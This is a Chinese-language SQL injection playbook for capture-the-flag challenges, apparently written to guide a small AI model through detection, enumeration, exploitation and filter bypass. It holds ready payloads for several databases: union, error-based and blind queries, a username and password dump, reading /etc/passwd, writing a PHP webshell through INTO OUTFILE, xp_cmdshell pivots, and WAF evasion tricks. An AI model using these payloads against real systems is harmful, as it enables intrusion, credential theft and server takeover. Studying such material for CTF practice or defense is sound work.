# SQL 注入

> 目标：让小模型在最短上下文内完成 **识别 → 验证 → 枚举 → 利用 → 绕过 → 排障**。

---

## 1. 题型识别

### 1.1 高频信号
- 单引号、双引号、括号导致报错或页面变化
- `order by`、`union`、`sleep`、数据库函数出现效果
- 条件真假导致响应长度、状态码、关键字不同
- 某些字段像 `id/sort/order/page/search/filter`
- 输入在 SQL 片段中而不是完整值中，例如排序、表名、列名、where 子句

### 1.2 最短验证顺序
1. 引号闭合：`'`、`")`、`'))`
2. 布尔判断：`and 1=1` / `and 1=2`
3. 列数探测：`order by n`
4. union 探测：`union select null,...`
5. 报错探测：数据库特有报错函数
6. 延时探测：`sleep/benchmark/pg_sleep/waitfor delay`

### 1.3 注入位置分类
- 数字型：`id=1 and 1=1`
- 字符型：`id=1' and '1'='1`
- 搜索型：`q=test' and ...`
- 排序型：`sort=if(1=1,name,id)`
- 更新/插入型：插入数据时触发、二次注入
- Header/Cookie 注入：User-Agent / XFF / Referer / Cookie
- JSON/XML 注入：API 里字段进入 SQL
- ORM/HQL/JPQL 注入：拼接发生在 ORM 层

---

## 2. 利用总图

```text
识别注入点
-> 判断回显方式（显错/回显/盲注/延时）
-> 判断数据库类型
-> 获取列数与显示位
-> 枚举库/表/列
-> 读敏感数据/读文件/写文件/命令执行（题目允许时）
```

---

## 3. 数据库类型识别

### 3.1 MySQL / MariaDB
- 函数：`database()`, `user()`, `version()`, `sleep()`, `if()`, `updatexml()`, `extractvalue()`
- 注释：`#`, `-- `, `/* */`
- 信息架构：`information_schema.schemata/tables/columns`

### 3.2 PostgreSQL
- 函数：`current_database()`, `version()`, `pg_sleep()`, `chr()`, `string_agg()`
- 拼接：`||`
- 信息表：`information_schema`, `pg_catalog`

### 3.3 SQL Server
- 函数：`db_name()`, `@@version`, `waitfor delay`, `isnull()`, `substring()`
- 系统库：`master..sysdatabases`, `sys.objects`
- 堆叠查询常见：`;`

### 3.4 Oracle
- 表：`dual`
- 延时：`dbms_pipe.receive_message`
- 列出表：`all_tables`, `all_tab_columns`

### 3.5 SQLite
- 表：`sqlite_master`
- 常见无 sleep；通过布尔或报错差异做盲注

---

## 4. 列数与回显位

### 4.1 order by 探测列数
```text
1 order by 1
1 order by 2
...
```
- 某个 n 报错，说明真实列数 < n

### 4.2 union 探测
```text
-1 union select null
-1 union select null,null
-1 union select 1,2,3
```
- 用数字或特征字符串定位显示位

### 4.3 无法使用 order by 时
- 用 `union select null,...`
- 用报错函数嵌套 `select`
- 用布尔盲注枚举列数

---

## 5. 常见注入类型

## 5.1 联合查询注入 Union-based
### 前提
- 能闭合语句
- 能使用 union
- 列数匹配
- 至少一个显示位可见

### 核心流程
1. 求列数
2. 找回显位
3. 枚举数据库、表、列
4. dump 数据

### MySQL 常用枚举
```sql
union select database(),user(),version()
union select group_concat(schema_name),null,null from information_schema.schemata
union select group_concat(table_name),null,null from information_schema.tables where table_schema=database()
union select group_concat(column_name),null,null from information_schema.columns where table_name='users'
union select group_concat(username,0x3a,password),null,null from users
```

### PostgreSQL
```sql
union select current_database(),version(),null
union select string_agg(table_name,','),null,null from information_schema.tables where table_schema='public'
```

### SQL Server
```sql
union select db_name(),@@version,null
union select name,null,null from master..sysdatabases
```

---

## 5.2 报错注入 Error-based
### 前提
- 错误信息可见或可被页面拼进响应

### MySQL 常用
```sql
and extractvalue(1,concat(0x7e,(select database()),0x7e))
and updatexml(1,concat(0x7e,(select version()),0x7e),1)
```

### SQL Server
- 类型转换报错、除零、XML 报错

### Oracle
- `to_char(1/0)`、XML 类型报错拼接

### 思路
让数据库在错误消息里拼出你想看的内容。

---

## 5.3 布尔盲注 Boolean-based
### 前提
- 条件真假时响应存在稳定差异（长度、标题、关键字、状态码）

### 核心骨架
```sql
and length(database())>5
and ascii(substr((select database()),1,1))>100
```

### 枚举套路
1. 猜长度
2. 二分字符 ASCII
3. 逐位还原字符串

### 真假对比优先看
- `len(response.text)`
- 某个固定关键词是否存在
- 某块 DOM 是否出现
- HTTP 302/403/200 差异

---

## 5.4 时间盲注 Time-based
### 前提
- 网络相对稳定
- 可以稳定制造延时

### MySQL
```sql
and if(ascii(substr(database(),1,1))>100,sleep(3),0)
```

### PostgreSQL
```sql
and case when ascii(substr(current_database(),1,1))>100 then pg_sleep(3) else 0 end is null
```

### SQL Server
```sql
; if (ascii(substring(db_name(),1,1))>100) waitfor delay '0:0:3'--
```

### 注意
- 先测 baseline 请求时间
- 每个 bit/字符至少测 2~3 次
- 阈值用相对差，不要只看一次

---

## 5.5 堆叠查询 Stacked Queries
### 前提
- 数据库和驱动支持多语句
- 分号不被拦截

### 常见用途
- 写表、建表、插入恶意数据
- SQL Server / PostgreSQL 中执行管理存储过程
- 二次注入落地

### 例子
```sql
1; select @@version--
```

---

## 5.6 二次注入 Second-order SQLi
### 特征
- 当前请求没回显
- 数据先被存入数据库，后续某处拼接再次执行
- 注册用户名、个人资料、留言、工单标题、HTTP 头特别常见

### 解题思路
1. 找到“存入点”
2. 找到“触发点”
3. payload 在第一次请求时保持可落库
4. 在第二次渲染/查询时触发

---

## 5.7 宽字节 / 转义绕过
### 场景
- 后端使用 `addslashes` 一类弱转义
- 编码为 GBK/Big5 等多字节

### 思路
构造 `%df%5c` 一类组合，让反斜杠与前字节形成合法多字节，从而“吃掉”转义。

### 判断条件
- 页面编码或数据库连接编码异常
- PHP 老题常见

---

## 5.8 Header / Cookie / JSON 注入
### 常见位置
- `User-Agent` 写日志再查数据库
- `X-Forwarded-For` 写审计表
- Cookie 中 role/user/id 被拼接
- JSON API 中 `{"id":"1' and ..."}`

### 验证策略
- 抓包固定其他参数
- 单独替换一个头/字段
- 比较响应差异

---

## 6. 枚举对象速查

### 6.1 MySQL
```sql
select database()
select group_concat(schema_name) from information_schema.schemata
select group_concat(table_name) from information_schema.tables where table_schema=database()
select group_concat(column_name) from information_schema.columns where table_name='users'
```

### 6.2 PostgreSQL
```sql
select current_database()
select string_agg(table_name,',') from information_schema.tables where table_schema='public'
select string_agg(column_name,',') from information_schema.columns where table_name='users'
```

### 6.3 SQLite
```sql
select group_concat(name) from sqlite_master where type='table'
select sql from sqlite_master where name='users'
```

---

## 7. 文件读写与进一步利用（CTF 常考）

## 7.1 MySQL 读文件
### 前提
- 数据库用户有 FILE 权限
- 路径可访问

```sql
union select load_file('/etc/passwd'),null,null
```

### 常见读取目标
- Linux：`/etc/passwd`, web 根目录源码, 配置文件
- Windows：`C:/Windows/win.ini`

## 7.2 MySQL 写文件
### 前提
- FILE 权限
- 目标目录可写
- Web 可访问或可被包含

```sql
union select '<?php eval($_POST[1]);?>',null,null into outfile '/var/www/html/shell.php'
```

> CTF 中常作为考点；真实环境要先确认路径、权限、secure_file_priv。

## 7.3 PostgreSQL / SQL Server 提权型利用
- PostgreSQL `COPY ... TO/FROM PROGRAM`（高权限时）
- SQL Server `xp_cmdshell`（开启且高权限时）

### 小模型必须先问的前提
- 当前数据库用户是谁？
- 是否高权限？
- 题目是否明显想考 DB → OS 跳板？

---

## 8. 绕过技巧总纲

> 不追求“字符 A 被过滤怎么办、字符 B 被过滤怎么办”的穷举，而是按 **语义替代** 组织。

### 8.1 空格过滤
- `/**/`
- `%0a`, `%09`, `%0b`, `%0c`, `%a0`
- 括号化：`and(1=1)`
- 关键字与括号粘连：`union(select 1)`

### 8.2 注释过滤
- 用括号、比较运算、闭合结构代替注释截断
- 或寻找原查询末尾天然闭合点

### 8.3 关键字过滤
#### 通用策略
1. 大小写混淆：`UnIoN SeLeCt`
2. 内联注释：`uni/**/on sel/**/ect`
3. 双写：`ununionion selselectect`
4. 同义函数：`substr/mid`, `ascii/ord`, `if/case when`
5. 编码：URL 编码、双编码、十六进制字符串
6. 拆词重组：参数污染、多参数拼接、JSON 数组

### 8.4 引号过滤
- 数字上下文直接比较
- 使用十六进制字符串：`0x61646d696e`
- 用 `char()/chr()` 拼字符串

### 8.5 逗号过滤
- `limit 1 offset 0`
- 子查询拆分
- 字符串拼接函数替代部分参数形式

### 8.6 回显受限
- 改用报错注入
- 改用盲注
- 改用延时
- 从响应头、状态码、重定向位置找差异

### 8.7 WAF 通杀思路
1. **降低 payload 危险度**：先验证闭合，不急着上大 payload
2. **把危险 token 外置**：值拆到 header/cookie/二次请求中再拼接
3. **换语义等价函数**：同一个逻辑用另一套函数写
4. **拆执行链**：先枚举长度，再逐字节，不一次 dump 全表
5. **模糊特征**：大小写、注释、编码、双写、多参数污染

---

## 9. 特殊场景

### 9.1 排序注入 / order by 注入
- 位置不在值，而在 SQL 关键字后
- 常规 `' and 1=1` 不一定有效
- 用条件表达式控制排序字段：
```sql
sort=if((select ascii(substr(database(),1,1)))>100,id,name)
```

### 9.2 like 注入
- `%`、`_` 自带通配意义
- 利用布尔条件时可借助 `regexp`、`like binary`

### 9.3 limit / offset 注入
- 常用于推测数据位置、枚举第 n 行

### 9.4 ORM / HQL / JPQL 注入
- 关键在于查询语言不同，但本质仍是拼接
- 注意对象名、字段名、排序字段、where 片段

---

## 10. 自动化思路

### 10.1 手写脚本时最少要做
- 超时
- 重试
- 保存中间结果
- 对真假响应做稳定判定函数

### 10.2 sqlmap 思维，不一定必须用 sqlmap
- 探测上下文
- 判断类型
- 尝试 union / error / blind / time
- 枚举 schema/table/column
- 在适合时做文件读写

---

## 11. 故障排查

### 11.1 为什么 `order by` 正常但 union 不行？
- 列数不匹配
- union 被过滤
- 没有可见回显位
- 当前查询不是 select

### 11.2 为什么 `and 1=1` / `and 1=2` 没区别？
- 注入不在 where，而在 order/group/limit
- 语法未闭合
- 条件执行了但页面模板没体现差异
- 请求参数没到后端

### 11.3 为什么延时不稳定？
- 网络抖动
- 线程池/缓存影响
- 语句没执行到 sleep 分支
- sleep 被 WAF / 驱动拦截

### 11.4 为什么能读库不能读文件？
- 无 FILE 权限
- 路径错
- secure_file_priv 限制
- DB 运行在容器里，路径与你想的不一样

---

## 12. 最短作战模板

```text
1. 先用引号/括号判断是否可控
2. 用 and 1=1 / and 1=2 判断真假差异
3. 用 order by 探列数；若失败则试 union null
4. 判断库类型
5. 能回显就 union / 报错；不能回显就盲注 / 时间盲注
6. 优先拿：database/user/version -> table -> column -> flag
7. 若题目明显想考进阶，再试文件读写/二次注入/堆叠查询
```
